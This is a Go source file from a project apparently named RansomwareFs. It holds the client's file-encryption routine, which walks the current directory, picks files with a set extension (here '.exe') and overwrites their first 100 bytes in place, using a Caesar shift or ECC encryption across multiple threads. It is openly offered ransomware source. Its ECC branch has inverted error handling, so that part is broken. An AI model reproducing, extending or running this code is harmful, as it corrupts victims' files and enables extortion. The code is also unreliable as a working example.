package client

import (
	"RansomwareFs/client/custom_example"
	"RansomwareFs/client/ecc/ecc_enc_file"
	"RansomwareFs/client/ecc/ecc_get_pub_key"
	"io/ioutil"
	"os"
	"path/filepath"
	"sync"
)

const (
	Method        string = "CUSTOM"
	FileExtension        = ".exe"
	ThreadNumber         = 10 // Number of threads to use for encryption
	FilePath      string = ""
)

// processFile reads a file, encrypts its first 100 bytes (or entire content if smaller),
// and writes the encrypted data back to the file
// Parameters:
//   - path: path to the file to process
//
// Returns:
//   - error if any file operation fails
func processFile(path string) error {
	// Read file content
	data, err := ioutil.ReadFile(path)
	if err != nil {
		return err
	}

	if len(data) == 0 {
		return nil // Skip empty files
	}

	// Only encrypt first 100 bytes (or less if file is smaller)
	encryptLen := 100
	if len(data) < encryptLen {
		encryptLen = len(data)
	}

	// Create a copy of the original data to preserve unencrypted parts
	newData := make([]byte, len(data))
	copy(newData, data)

	// Encrypt only the first portion
	switch Method {
	case "CUSTOM":
		encrypted := custom_example.CaesarEncrypt(newData[:encryptLen], 3)
		copy(newData[:encryptLen], encrypted)
		break
	case "ECC":
		publicKeyPEM := ecc_get_pub_key.GetPublicKey()
		encrypted, err := ecc_enc_file.EccEncrypt(newData[:encryptLen], publicKeyPEM)
		if err != nil {
			copy(newData[:encryptLen], encrypted)
		} else {
			println("ECC Encryption failed", err)
			return err
		}
		break
	}

	// Write back the modified data (only first portion encrypted)
	return ioutil.WriteFile(path, newData, 0644)
}

// EncryptFile finds all files with specified extension in current directory,
// and encrypts them using either single-thread or multi-thread approach
// based on the number of files found and ThreadNumber parameter
// Parameters:
//   - FileExtension: target file extension to encrypt (e.g. ".txt")
//   - ThreadNumber: maximum number of threads to use
//
// Returns:
//   - error if any file operation fails
func EncryptFile(FileExtension string, ThreadNumber int) error {
	var files []string

	// Walk through current directory to find all files with target extension
	err := filepath.Walk(".", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() && filepath.Ext(path) == FileExtension {
			files = append(files, path)
		}
		return nil
	})
	if err != nil {
		return err
	}

	// If number of files is less than or equal to ThreadNumber, use single-thread approach
	if len(files) <= ThreadNumber {
		for _, file := range files {
			if err := processFile(file); err != nil {
				return err
			}
		}
	} else {
		// Use multi-thread approach when there are more files than ThreadNumber
		var wg sync.WaitGroup
		filesPerThread := len(files) / ThreadNumber

		// Divide files among threads
		for i := 0; i < ThreadNumber; i++ {
			start := i * filesPerThread
			end := (i + 1) * filesPerThread
			// Last thread gets remaining files
			if i == ThreadNumber-1 {
				end = len(files)
			}

			wg.Add(1)
			go func(filePaths []string) {
				defer wg.Done()
				for _, file := range filePaths {
					processFile(file)
				}
			}(files[start:end])
		}
		wg.Wait()
	}

	return nil
}

func Run() {

	EncryptFile(FileExtension, ThreadNumber)
}
